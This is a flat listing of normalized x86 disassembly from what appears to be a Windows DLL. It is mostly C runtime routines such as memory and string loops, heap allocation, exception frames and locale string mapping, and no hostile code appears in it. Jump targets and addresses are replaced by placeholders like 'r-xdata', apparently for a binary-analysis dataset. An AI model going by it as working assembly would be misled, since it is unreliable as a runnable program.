mov ecx [ eax + 0x8 ]
xor ecx [ ebp + 0xc ]
call sub_1001a809
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
and eax 0x66
je r-xdata
push 0x1
mov eax [ ebp + 0xc ]
push [ eax + 0x18 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x14 ]
mov eax [ ebp + 0xc ]
push [ eax + 0xc ]
push 0x0
push [ ebp + 0x10 ]
mov eax [ ebp + 0xc ]
push [ eax + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001d8d5
add esp 0x20
mov eax [ ebp + 0xc ]
cmp [ eax + 0x24 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
mov [ eax + 0x24 ] 0x1
xor eax eax
inc eax
jmp r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x123
call sub_1001a51b
add esp 0x1c
mov eax [ ebp - 0x4 ]
mov ebx [ ebp + 0xc ]
mov esp [ ebx + 0x1c ]
mov ebp [ ebx + 0x20 ]
jmp eax
push [ ebp + 0x8 ]
push [ ebp + 0xc ]
call sub_1001a45e
pop ebx
leave
retn
sub_1001a691
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x10 ]
mov esi [ edi + 0xc ]
mov [ ebp - 0x4 ] eax
mov ebx esi
jmp r-xdata
mov [ ebp + 0x8 ] esi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x14 ]
inc esi
mov [ eax ] esi
mov eax [ ebp + 0x18 ]
mov [ eax ] ebx
cmp ebx [ edi + 0xc ]
ja r-xdata
mov ecx [ ebp + 0x10 ]
dec esi
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
cmp [ eax + 0x4 ] ecx
jge r-xdata
call sub_1001e694
call sub_1001e694
cmp esi ebx
jbe r-xdata
cmp esi 0xffffffff
jne r-xdata
cmp ecx [ eax + 0x8 ]
jle r-xdata
mov eax esi
imul eax eax 0x14
add eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
leave
retn
cmp [ ebp + 0xc ] 0x0
jge r-xdata
dec [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
sub_1001a704
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
mov [ esi ] eax
call sub_1001e316
mov eax [ eax + 0x98 ]
mov [ esi + 0x4 ] eax
call sub_1001e316
mov [ eax + 0x98 ] esi
mov eax esi
pop esi
pop ebp
retn
sub_1001a730
mov edi edi
push ebp
mov ebp esp
call sub_1001e316
mov eax [ eax + 0x98 ]
jmp r-xdata
test eax eax
jne r-xdata
mov ecx [ eax ]
cmp ecx [ ebp + 0x8 ]
je r-xdata
inc eax
pop ebp
retn
xor eax eax
pop ebp
retn
mov eax [ eax + 0x4 ]
sub_1001a757
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001e316
mov esi [ ebp + 0x8 ]
cmp esi [ eax + 0x98 ]
jne r-xdata
call sub_1001e316
mov eax [ eax + 0x98 ]
jmp r-xdata
call sub_1001e316
mov ecx [ esi + 0x4 ]
mov [ eax + 0x98 ] ecx
cmp [ eax + 0x4 ] 0x0
jne r-xdata
mov ecx [ eax + 0x4 ]
cmp esi ecx
je r-xdata
pop esi
pop ebp
jmp sub_1001e694
mov ecx [ esi + 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
mov eax ecx
pop esi
pop ebp
retn
sub_1001a7a9
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1001a4e8
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_1001e6e0
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1001a818
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
jmp r-xdata
push [ ebp + 0x8 ]
call sub_1001aa2a
pop ecx
test eax eax
je r-xdata
push [ ebp + 0x8 ]
call sub_1001e841
pop ecx
test eax eax
je r-xdata
leave
retn
test [ rw-data ] 0x1
mov edi rw-data
mov esi r--data
jne r-xdata
push edi
lea ecx [ ebp - 0x10 ]
call sub_10019c51
push r--data
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x10 ] esi
call sub_1001a898
int3
or [ rw-data ] 0x1
push 0x1
lea eax [ ebp - 0x4 ]
push eax
mov ecx edi
mov [ ebp - 0x4 ] r--data
call sub_10019b1d
push sub_1002e8e1
mov [ rw-data ] esi
call sub_1001b004
pop ecx
sub_1001a898
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ ebp + 0x8 ]
push esi
push edi
push 0x8
pop ecx
mov esi r--data
lea edi [ ebp - 0x20 ]
[ edi ] [ esi ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0xc ]
pop edi
mov [ ebp - 0x4 ] eax
pop esi
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
call [ RaiseException@IAT ]
leave
retn 0x8
test [ eax ] 0x8
je r-xdata
mov [ ebp - 0xc ] 0x1994000
sub_1001a8ef
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push esi
lea eax [ ebp - 0x4 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001e869
mov esi eax
add esp 0xc
test esi esi
jne r-xdata
mov eax esi
pop esi
leave
retn
cmp [ ebp - 0x4 ] eax
je r-xdata
call sub_1001bddd
test eax eax
je r-xdata
call sub_1001bddd
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
sub_1001a92f
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x14 ]
test esi esi
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
pop esi
pop ebp
retn
push [ ebp + 0xc ]
push 0x0
push [ ebp + 0x8 ]
call sub_1001a9b0
add esp 0xc
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] esi
jb r-xdata
cmp [ ebp + 0xc ] esi
jae r-xdata
push esi
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_10019cf0
add esp 0xc
jmp r-xdata
push 0x16
pop eax
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
sub_1001a9b0
mov edx [ esp + 0xc ]
mov ecx [ esp + 0x4 ]
test edx edx
je r-xdata
mov eax [ esp + 0x4 ]
retn
xor eax eax
mov al [ esp + 0x8 ]
test al al
jne r-xdata
push edi
mov edi ecx
cmp edx 0x4
jb r-xdata
cmp edx 0x80
jb r-xdata
mov [ edi ] al
add edi 0x1
sub edx 0x1
jne r-xdata
neg ecx
and ecx 0x3
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ esp + 0x8 ]
pop edi
retn
mov ecx eax
shl eax 0x8
add eax ecx
mov ecx eax
shl eax 0x10
add eax ecx
mov ecx edx
and edx 0x3
shr ecx 0x2
je r-xdata
sub edx ecx
jmp sub_1001ea85
[ edi ]
test edx edx
je r-xdata
mov [ edi ] al
add edi 0x1
sub ecx 0x1
jne r-xdata
sub_1001aa2a
mov edi edi
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0xffffffe0
ja r-xdata
push ebx
call sub_1001e841
pop ecx
call sub_1001bddd
mov [ eax ] 0xc
xor eax eax
push esi
push edi
test ebx ebx
je r-xdata
call sub_1001df40
push 0x1e
call sub_1001dd91
push 0xff
call sub_1001eb6a
xor eax eax
inc eax
mov eax ebx
jmp r-xdata
mov eax edi
pop edi
pop esi
jmp r-xdata
push 0xc
pop esi
cmp [ rw-data ] eax
je r-xdata
push eax
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
pop ebx
pop ebp
retn
call sub_1001bddd
mov [ eax ] esi
push ebx
call sub_1001e841
pop ecx
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
jmp r-xdata
call sub_1001bddd
mov [ eax ] esi
sub_1001aac0
mov eax [ esp + 0xc ]
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov edx [ esp + 0x8 ]
xor ebx ebx
mov bl [ esp + 0xc ]
test edx 0x3
je r-xdata
sub eax 0x4
jb r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
add eax 0x4
je r-xdata
push edi
mov edi ebx
shl ebx 0x8
add ebx edi
mov edi ebx
shl ebx 0x10
add ebx edi
jmp r-xdata
lea eax [ edx - 0x1 ]
pop ebx
retn
sub eax 0x1
je r-xdata
mov cl [ edx ]
add edx 0x1
xor cl bl
je r-xdata
mov ecx [ edx ]
xor ecx ebx
mov edi 0x7efefeff
add edi ecx
xor ecx 0xffffffff
xor ecx edi
add edx 0x4
and ecx 0x81010100
je r-xdata
test edx 0x3
jne r-xdata
sub eax 0x1
jne r-xdata
sub eax 0x4
jb r-xdata
mov ecx [ edx - 0x4 ]
xor cl bl
je r-xdata
pop edi
lea eax [ edx - 0x4 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
lea eax [ edx - 0x3 ]
pop edi
pop ebx
retn
shr ecx 0x10
xor cl bl
je r-xdata
lea eax [ edx - 0x2 ]
pop edi
pop ebx
retn
xor ch bl
je r-xdata
pop edi
jmp r-xdata
sub_1001aba0
push ebp
mov ebp esp
push esi
xor eax eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
push eax
mov edx [ ebp + 0xc ]
lea ecx [ ecx ]
mov esi [ ebp + 0x8 ]
or ecx 0xffffffff
lea ecx [ ecx ]
add edx 0x1
bts [ esp ] eax
jmp r-xdata
mov eax ecx
add esp 0x20
pop esi
leave
retn
add esi 0x1
bt [ esp ] eax
jae r-xdata
mov al [ edx ]
or al al
je r-xdata
add ecx 0x1
mov al [ esi ]
or al al
je r-xdata
sub_1001abe6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
test eax eax
je r-xdata
xor eax eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
cmp [ ebp + 0xc ] eax
jae r-xdata
pop esi
pop ebp
retn
push eax
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1001a060
add esp 0xc
call sub_1001bddd
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
call sub_1001ea75
mov eax esi
jmp r-xdata
sub_1001ac39
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f36c
add esp 0x14
pop ebp
retn
sub_1001acd0
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
push esi
cmp ebx 0x4
jb r-xdata
xor eax eax
jmp r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
lea esi [ ebx - 0x4 ]
test esi esi
je r-xdata
pop ebx
leave
retn
cmp esi ebx
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov dl [ eax ]
test dl dl
je r-xdata
xor eax eax
movzx eax [ eax - 0x4 ]
movzx ecx [ ecx - 0x4 ]
jmp r-xdata
cmp dl [ ecx - 0x4 ]
jne r-xdata
movzx eax [ eax ]
movzx ecx [ ecx ]
cmp dl [ ecx ]
jne r-xdata
sub eax ecx
jmp r-xdata
mov dl [ eax - 0x3 ]
test dl dl
je r-xdata
pop esi
inc eax
inc esi
inc ecx
movzx eax [ eax - 0x3 ]
movzx ecx [ ecx - 0x3 ]
jmp r-xdata
cmp dl [ ecx - 0x3 ]
jne r-xdata
mov dl [ eax - 0x2 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x2 ]
movzx ecx [ ecx - 0x2 ]
jmp r-xdata
cmp dl [ ecx - 0x2 ]
jne r-xdata
mov dl [ eax - 0x1 ]
test dl dl
je r-xdata
movzx eax [ eax - 0x1 ]
movzx ecx [ ecx - 0x1 ]
jmp r-xdata
cmp dl [ ecx - 0x1 ]
jne r-xdata
add [ ebp - 0x4 ] 0x4
cmp [ ebp - 0x4 ] esi
jb r-xdata
mov dl [ eax ]
add eax 0x4
add ecx 0x4
test dl dl
je r-xdata
jmp r-xdata
mov esi [ ebp - 0x4 ]
jmp r-xdata
sub_1001adbe
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
push [ rw-data ]
call [ DecodePointer@IAT ]
mov esi eax
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
and [ eax ] 0x0
push edi
test esi esi
jne r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
push 0x4
push [ ebp + 0x8 ]
call esi
test eax eax
jne r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov [ ebp - 0x4 ] eax
test eax eax
jne r-xdata
pop esi
leave
retn
xor eax eax
call sub_1001bddd
mov [ eax ] 0xc
call sub_1001bddd
mov eax [ eax ]
jmp r-xdata
push r--data
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
call sub_1001bddd
push 0x16
pop esi
mov [ eax ] esi
call sub_1001ea75
mov eax esi
jmp r-xdata
pop edi
push ebx
push esi
call [ EncodePointer@IAT ]
mov edi eax
call sub_1001e166
push edi
push rw-data
mov ebx eax
call [ InterlockedExchange@IAT ]
cmp eax ebx
pop ebx
je r-xdata
call sub_1001bddd
mov esi [ GetLastError@IAT ]
mov edi eax
call esi
push eax
call sub_1001bd9b
pop ecx
mov [ edi ] eax
call sub_1001ea75
call esi
push eax
call sub_1001bd9b
pop ecx
jmp r-xdata
push [ ebp - 0x4 ]
call [ FreeLibrary@IAT ]
sub_1001aee1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ DecodePointer@IAT ]
push edi
push [ rw-data ]
call esi
push [ rw-data ]
mov ebx eax
mov [ ebp - 0x4 ] ebx
call esi
mov esi eax
cmp esi ebx
jb r-xdata
xor eax eax
mov edi esi
sub edi ebx
lea eax [ edi + 0x4 ]
cmp eax 0x4
jb r-xdata
push ebx
call sub_1002025f
mov ebx eax
lea eax [ edi + 0x4 ]
pop ecx
cmp ebx eax
jae r-xdata
push [ ebp + 0x8 ]
mov edi [ EncodePointer@IAT ]
call edi
mov [ esi ] eax
add esi 0x4
push esi
call edi
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
jmp r-xdata
mov eax 0x800
cmp ebx eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax ebx
cmp eax ebx
jb r-xdata
mov eax ebx
lea eax [ ebx + 0x10 ]
cmp eax ebx
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1001bd4d
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1001bd4d
pop ecx
pop ecx
test eax eax
je r-xdata
sar edi 0x2
push eax
lea esi [ eax + edi * 4 ]
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
sub_1001af97
mov edi edi
push esi
push 0x4
push 0x20
call sub_1001bd01
pop ecx
pop ecx
mov esi eax
push esi
call [ EncodePointer@IAT ]
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_1001afc8
push 0xc
push r--data
call sub_10020070
call sub_1001eb82
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1001aee1
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001affe
mov eax [ ebp - 0x1c ]
call sub_100200b5
retn
sub_1001b01b
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
jmp r-xdata
mov [ ebp - 0x14 ] 0x42
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x20 ] esi
cmp edi 0x3fffffff
jbe r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
lea eax [ edi + edi ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x1c ] 0x7fffffff
jmp r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push eax
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi * 2 - 0x2 ] ax
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1001f13e
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
inc [ ebp - 0x20 ]
jmp r-xdata
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_1001f13e
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_1001b111
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push sub_10020292
call sub_1001b01b
add esp 0x18
test eax eax
jns r-xdata
pop ebp
retn
or eax 0xffffffff
sub_1001b13b
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
pop ebp
retn
call sub_1001bddd
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_1001ea75
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_10020efe
call sub_1001b01b
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
xor ecx ecx
mov [ esi ] cx
pop esi
pop ebp
retn
call sub_1001bddd
mov [ eax ] 0x22
sub_1001b1b4
mov edi edi
push ebp
mov ebp esp
lea eax [ ebp + 0x14 ]
push eax
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001b13b
add esp 0x14
pop ebp
retn
sub_1001b1d2
push 0x8
push r--data
call sub_10020070
mov eax [ ebp + 0xc ]
cmp eax 0x1
jne r-xdata
xor edi edi
cmp eax edi
jne r-xdata
call sub_1001e134
test eax eax
jne r-xdata
cmp eax 0x2
jne r-xdata
cmp [ rw-data ] edi
jle r-xdata
call sub_1001e4cd
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
cmp eax 0x3
jne r-xdata
call sub_1001e178
push 0x214
push 0x1
call sub_1001bd01
pop ecx
pop ecx
mov esi eax
cmp esi edi
je r-xdata
dec [ rw-data ]
mov [ ebp - 0x4 ] edi
cmp [ rw-data ] edi
jne r-xdata
call sub_10022112
call [ GetCommandLineA@IAT ]
mov [ rw-data ] eax
call sub_1002207b
mov [ rw-data ] eax
call sub_10021ab2
test eax eax
jns r-xdata
call sub_1001e152
jmp r-xdata
call sub_100200b5
retn 0xc
xor eax eax
inc eax
push edi
call sub_1001e45f
pop ecx
push esi
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
test eax eax
je r-xdata
cmp [ ebp + 0x10 ] edi
jne r-xdata
call sub_1001edd8
call sub_10021fc0
test eax eax
js r-xdata
call sub_1001e1ac
jmp r-xdata
push esi
call sub_1001a3eb
pop ecx
jmp r-xdata
push edi
push esi
call sub_1001e1e9
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
mov [ esi ] eax
or [ esi + 0x4 ] 0xffffffff
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001b2ab
jmp r-xdata
call sub_10021cf7
call sub_1001e1ac
call sub_1001e152
call sub_10021cf7
jmp r-xdata
call sub_10021d4a
test eax eax
js r-xdata
push 0x0
call sub_1001ebeb
pop ecx
test eax eax
jne r-xdata
inc [ rw-data ]
jmp r-xdata
sub_1001b336
push 0xc
push r--data
call sub_10020070
mov edi ecx
mov esi edx
mov ebx [ ebp + 0x8 ]
xor eax eax
inc eax
mov [ ebp - 0x1c ] eax
test esi esi
jne r-xdata
and [ ebp - 0x4 ] 0x0
cmp esi eax
je r-xdata
cmp [ rw-data ] edx
je r-xdata
mov eax [ r--data ]
test eax eax
je r-xdata
cmp esi 0x2
jne r-xdata
xor eax eax
cmp [ ebp - 0x1c ] 0x0
je r-xdata
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
push edi
push esi
push ebx
call sub_10018f00
mov [ ebp - 0x1c ] eax
cmp esi 0x1
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
push edi
push esi
push ebx
call sub_1001b1d2
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
push edi
push esi
push ebx
call sub_1001b1d2
test eax eax
jne r-xdata
cmp esi 0x3
jne r-xdata
push edi
push eax
push ebx
call sub_10018f00
push edi
push 0x0
push ebx
call sub_1001b1d2
mov eax [ r--data ]
test eax eax
je r-xdata
cmp [ ebp - 0x1c ] 0x0
je r-xdata
and [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
jmp r-xdata
push edi
push 0x0
push ebx
call eax
mov eax [ r--data ]
test eax eax
je r-xdata
call sub_100200b5
retn
push edi
push esi
push ebx
call eax
mov [ ebp - 0x1c ] eax
_start
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
jne r-xdata
push [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
call sub_1001b336
pop ecx
pop ebp
retn 0xc
call sub_1002215e
sub_1001b44f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
pop ebp
retn
sub eax 0x8
cmp [ eax ] 0xdddd
jne r-xdata
push eax
call sub_1001a3eb
pop ecx
sub_1001b46f
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
mov esi ecx
mov [ esi + 0xc ] 0x0
test eax eax
jne r-xdata
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
call sub_1001e316
mov [ esi + 0x8 ] eax
mov ecx [ eax + 0x6c ]
mov [ esi ] ecx
mov ecx [ eax + 0x68 ]
mov [ esi + 0x4 ] ecx
mov ecx [ esi ]
cmp ecx [ rw-data ]
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax [ rw-data ]
je r-xdata
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
mov eax [ esi + 0x8 ]
test [ eax + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
mov ecx [ rw-data ]
test [ eax + 0x70 ] ecx
jne r-xdata
call sub_1001f0c5
mov [ esi ] eax
mov eax esi
pop esi
pop ebp
retn 0x4
or [ eax + 0x70 ] 0x2
mov [ esi + 0xc ] 0x1
jmp r-xdata
call sub_1002241c
mov [ esi + 0x4 ] eax
sub_1001b4f6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x18 ]
push ebx
xor ebx ebx
push esi
push edi
cmp edx ebx
jle r-xdata
mov [ ebp - 0x8 ] ebx
cmp [ ebp + 0x24 ] ebx
jne r-xdata
mov eax [ ebp + 0x14 ]
mov ecx edx
mov esi [ MultiByteToWideChar@IAT ]
xor eax eax
cmp [ ebp + 0x28 ] ebx
push ebx
push ebx
push [ ebp + 0x18 ]
setne al
push [ ebp + 0x14 ]
lea eax [ eax * 8 + 0x1 ]
push eax
push [ ebp + 0x24 ]
call esi
mov edi eax
mov [ ebp - 0x10 ] edi
cmp edi ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov eax [ eax + 0x4 ]
mov [ ebp + 0x24 ] eax
mov eax edx
sub eax ecx
dec eax
cmp eax edx
jge r-xdata
inc eax
cmp ecx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov [ ebp + 0x18 ] eax
inc eax
dec ecx
cmp [ eax ] bl
je r-xdata
or ecx 0xffffffff
mov [ ebp - 0xc ] ebx
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x1c ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1001a809
leave
retn
push edi
push [ ebp - 0xc ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push 0x1
push [ ebp + 0x24 ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp - 0xc ]
call sub_1001b44f
mov eax [ ebp - 0x8 ]
pop ecx
mov esi [ LCMapStringW@IAT ]
push ebx
push ebx
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
je r-xdata
push eax
call sub_1001aa2a
pop ecx
cmp eax ebx
je r-xdata
call sub_100228e0
mov eax esp
cmp eax ebx
je r-xdata
mov ecx 0x400
test [ ebp + 0x10 ] ecx
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
mov edi [ ebp - 0x8 ]
cmp edi ebx
jle r-xdata
mov eax [ ebp + 0x20 ]
cmp eax ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
xor edi edi
push 0xffffffe0
xor edx edx
pop eax
div edi
cmp eax 0x2
jb r-xdata
cmp [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0x8 ]
push edi
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
test eax eax
je r-xdata
lea eax [ edi + edi + 0x8 ]
cmp eax ecx
ja r-xdata
push eax
push [ ebp + 0x1c ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call esi
jmp r-xdata
push edi
call sub_1001b44f
pop ecx
push ebx
push ebx
cmp [ ebp + 0x20 ] ebx
jne r-xdata
push eax
call sub_1001aa2a
pop ecx
cmp eax ebx
je r-xdata
call sub_100228e0
mov edi esp
cmp edi ebx
je r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ebx
push ebx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push edi
push ebx
push [ ebp + 0x24 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp edi ebx
je r-xdata
sub_1001b6dd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1001b46f
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_1001b4f6
add esp 0x24
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001b74c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
